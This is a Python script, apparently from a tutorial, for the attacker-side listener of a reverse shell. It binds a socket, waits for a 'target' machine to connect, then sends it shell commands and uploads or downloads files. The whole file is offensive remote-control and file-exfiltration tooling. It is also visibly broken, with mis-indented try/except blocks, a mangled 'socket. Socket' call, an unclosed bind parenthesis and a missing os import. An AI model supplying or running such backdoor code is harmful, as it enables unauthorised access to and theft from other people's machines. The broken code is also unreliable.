#Socket: allows us to initiate an internet connection between two machines 
import socket 

#Allows us to more easily parse the data 
import json 

def reliable_send(data): 
  jsondata =  json.dumps(data) 
  target.send(jsondata.encode()) 

def reliable_recv(): 
  data = ''
  while True:
        try:
          data = data + target.recv(1024).decode().rstrip() 
          return json.loads(data) 
  except ValueError: 
      continue 

#File name as parameter. Open the file you want to upload to the server (file_name) with rb (read bytes) and send the content to the server program 
def upload_file(file_name): 
  f = open(file_name, 'rb') 
  target.send(f.read()) 


def download_file(file_name):  
  f = open(file_name, 'wb') 
  target.settimeout(1) 
  chunk = target.recv(1024) 
  while chunk:  
    f.write(chunk) 
    try: 
      chunk = target.recv(1024) 

#If we run into a timeout as an error, we break out of the while chunk loop, meaning we reached the end of the file 
except socket.timeout as e: 
  break 

#At the end, set the timeout to non-existent, then close within our function 
target.settimeout(None) 
f.close() 

#Asking for the input of the command, then sending that command to the target, then check if the command is quit (type quit), then the program exits, if it wasn’t the response is stored to the result variable, then print result.  
def target_communication(): 
  while True: 
    command = input('* Shell~%s: ' % str(ip)) 
    reliable_send(command) 
    if command == 'quit': 
      break 
    elif command == 'clear': 
      os.system('clear') 
    elif command [: 3] == 'cd ': 
      pass 
    elif command[:8] == 'download': 
      download_file(command[9:]) 
    elif command[:6] == 'upload': 
      upload_file(command[7:]) 
    else: 
      result = reliable_recv() 
      print(result) 

 

#Initiate the socket  
sock = socket. Socket(socket.AF_INET, socket.SOCK_STREAM) 

#Bind IP address and the port 
sock.bind(('IP ADDRESS', PORT)  #//CHANGE THIS 

#Listen for incoming connections (5 connections) 
print('[+] Listening for the incoming connections') 
sock.listen(5) 

#Accept the incoming connection – stores the target socket object and the IP address  
target, ip = sock.accept() 
print('[+] Target Connected From: ' + str(ip)) 

target_communication() 

 
